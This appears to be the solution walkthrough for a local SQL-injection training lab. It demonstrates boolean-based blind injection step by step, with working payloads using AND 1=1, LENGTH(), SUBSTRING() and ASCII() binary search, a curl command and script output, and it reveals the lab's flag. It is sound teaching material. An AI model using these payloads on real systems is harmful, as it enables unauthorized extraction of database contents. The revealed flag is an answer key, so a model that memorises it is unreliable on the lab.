<h4>Step 1: Identify a Valid Username</h4>
<p>
    First, find a valid active member to use as a baseline for the boolean oracle.
    Try common usernames like <code>admin</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>admin<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> -- membership confirmed.
    </div>
</div>

<h4>Step 2: Confirm the Boolean Oracle</h4>
<p>
    Inject a tautology (<code>AND 1=1</code>) and a contradiction (<code>AND 1=2</code>)
    to verify that you can control the boolean result. The query is:
    <code>WHERE username = '$user' AND is_active = 1</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Confirm Boolean Oracle</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>admin' AND 1=1 -- -<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> (TRUE condition -- same as baseline)<br><br>
        <span class="prompt">Input: </span>admin' AND 1=2 -- -<br>
        <span class="prompt">Response: </span><strong>Member not found</strong> (FALSE condition -- different from baseline)
    </div>
</div>

<p>
    The two different responses confirm a boolean-based blind injection point. We can now
    append any condition and determine whether it is true or false based on the response.
</p>

<h4>Step 3: Determine the Flag Length</h4>
<p>
    Use <code>LENGTH()</code> to find the length of the flag. Use a binary search approach:
    start with <code>&gt; 20</code>, narrow down until you find the exact value.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Find Flag Length</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>admin' AND (SELECT LENGTH(flag_value) FROM secrets LIMIT 1) > 20 -- -<br>
        <span class="prompt">Response: </span>Member is active (TRUE -- length > 20)<br><br>
        <span class="prompt">Input: </span>admin' AND (SELECT LENGTH(flag_value) FROM secrets LIMIT 1) > 30 -- -<br>
        <span class="prompt">Response: </span>Member not found (FALSE -- length is NOT > 30)<br><br>
        <span class="prompt">Input: </span>admin' AND (SELECT LENGTH(flag_value) FROM secrets LIMIT 1) > 25 -- -<br>
        <span class="prompt">Response: </span>Member is active (TRUE -- length > 25)<br><br>
        <span class="prompt">Input: </span>admin' AND (SELECT LENGTH(flag_value) FROM secrets LIMIT 1) > 26 -- -<br>
        <span class="prompt">Response: </span>Member not found (FALSE -- length is NOT > 26)<br><br>
        <span class="prompt">Input: </span>admin' AND (SELECT LENGTH(flag_value) FROM secrets LIMIT 1) = 26 -- -<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> (TRUE -- length is exactly 26)
    </div>
</div>

<p>
    The flag is <strong>26 characters</strong> long.
</p>

<h4>Step 4: Extract the First Characters with SUBSTRING</h4>
<p>
    Use <code>SUBSTRING()</code> to test each character position. Start with position 1.
    Since we expect the flag to start with <code>FLAG{</code>, test those characters first.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Extract Character by Character</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Pos 1: </span>admin' AND SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),1,1) = 'F' -- -<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> (char 1 = 'F')<br><br>
        <span class="prompt">Pos 2: </span>admin' AND SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),2,1) = 'L' -- -<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> (char 2 = 'L')<br><br>
        <span class="prompt">Pos 3: </span>admin' AND SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),3,1) = 'A' -- -<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> (char 3 = 'A')<br><br>
        <span class="prompt">Pos 4: </span>admin' AND SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),4,1) = 'G' -- -<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> (char 4 = 'G')<br><br>
        <span class="prompt">Pos 5: </span>admin' AND SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),5,1) = '{' -- -<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> (char 5 = '{')<br><br>
        <span class="prompt">Pos 6: </span>admin' AND SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),6,1) = 'b' -- -<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> (char 6 = 'b')
    </div>
</div>

<p>So far we have: <code>FLAG{b...</code></p>

<h4>Step 5: Optimise with ASCII + Binary Search</h4>
<p>
    Testing every printable character is slow (~95 attempts per position worst-case).
    Use <code>ASCII(SUBSTRING(...))</code> and binary search to narrow down each character
    in ~7 queries instead of ~95. This is also more reliable because MySQL string
    comparison is <strong>case-insensitive</strong> by default (collation <code>utf8_general_ci</code>),
    but <code>ASCII()</code> returns the exact byte value.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Binary Search with ASCII</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Finding char at position 7 (expected: 'l' = ASCII 108)</span><br><br>
        <span class="prompt">Input: </span>admin' AND ASCII(SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),7,1)) > 96 -- -<br>
        <span class="prompt">Response: </span>Member is active (TRUE -- ASCII > 96)<br><br>
        <span class="prompt">Input: </span>admin' AND ASCII(SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),7,1)) > 112 -- -<br>
        <span class="prompt">Response: </span>Member not found (FALSE -- ASCII NOT > 112)<br><br>
        <span class="prompt">Input: </span>admin' AND ASCII(SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),7,1)) > 104 -- -<br>
        <span class="prompt">Response: </span>Member is active (TRUE -- ASCII > 104)<br><br>
        <span class="prompt">Input: </span>admin' AND ASCII(SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),7,1)) > 108 -- -<br>
        <span class="prompt">Response: </span>Member not found (FALSE -- ASCII NOT > 108)<br><br>
        <span class="prompt">Input: </span>admin' AND ASCII(SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),7,1)) = 108 -- -<br>
        <span class="prompt">Response: </span><strong>Member is active</strong> (TRUE -- ASCII 108 = 'l')
    </div>
</div>

<p>
    In just 5 queries we found position 7 = <code>l</code> (ASCII 108). Compared to
    testing every character one by one, binary search is <strong>~14x faster</strong>.
</p>

<h4>Step 6: Full Extraction</h4>
<p>
    Repeat the binary search for all 26 positions. Here is the complete flag:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Complete Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Position: </span> 1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26<br>
        <span class="prompt">Char:     </span> F  L  A  G  {  b  l  1  n  d  _  b  0  0  l  _  s  u  b  s  t  r  1  n  g  }<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{bl1nd_b00l_substr1ng}</strong>
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{bl1nd_b00l_substr1ng}</code>.
</p>

<h4>Step 8: Python Automation Script</h4>
<p>
    Manual extraction of 26 characters via binary search requires ~182 requests.
    Use this Python script to automate the entire process:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Python Automation (lab9_blind_boolean.py)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 scripts/lab9_blind_boolean.py http://localhost/SQLi-Arena<br><br>
        <span class="prompt">[*] </span>Target: http://localhost/SQLi-Arena/mysql/lab9<br>
        <span class="prompt">[*] </span>Confirming boolean oracle...<br>
        <span class="prompt">[+] </span>Boolean oracle confirmed (TRUE=active, FALSE=not found)<br>
        <span class="prompt">[*] </span>Finding flag length...<br>
        <span class="prompt">[+] </span>Flag length: 26<br>
        <span class="prompt">[*] </span>Extracting flag (26 chars, ~7 requests each)...<br>
        <span class="prompt">&nbsp;&nbsp;[ 1/26] </span>F<br>
        <span class="prompt">&nbsp;&nbsp;[ 2/26] </span>FL<br>
        <span class="prompt">&nbsp;&nbsp;[ 3/26] </span>FLA<br>
        <span class="prompt">&nbsp;&nbsp;...</span><br>
        <span class="prompt">&nbsp;&nbsp;[26/26] </span>FLAG{bl1nd_b00l_substr1ng}<br><br>
        <span class="prompt">[+] </span>Flag: FLAG{bl1nd_b00l_substr1ng}
    </div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Script Source: lab9_blind_boolean.py</span>
    </div>
    <div class="terminal-body"><pre style="margin:0;white-space:pre;overflow-x:auto;"><?php echo htmlspecialchars(file_get_contents(__DIR__ . '/scripts/lab9_blind_boolean.py')); ?></pre></div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Manual Single-Character Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mysql/lab9" \<br> --data-urlencode "user=admin' AND ASCII(SUBSTRING((SELECT flag_value FROM secrets LIMIT 1),1,1)) = 70 -- -"<br><br>
        <span class="prompt"># </span>ASCII 70 = 'F' -- returns "Member is active -- membership confirmed." (TRUE)
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Boolean-based blind injection exploits any observable
    difference in application behavior (even a single word change). With
    <code>SUBSTRING()</code> and <code>ASCII()</code>, an attacker can extract entire
    database contents one bit at a time. Defense: use prepared statements, and avoid
    revealing ANY difference based on query success or failure when possible.
    Note that MySQL's default collation is case-insensitive for string comparisons,
    so using <code>ASCII()</code> with binary search is more reliable than direct
    character comparison.
</div>
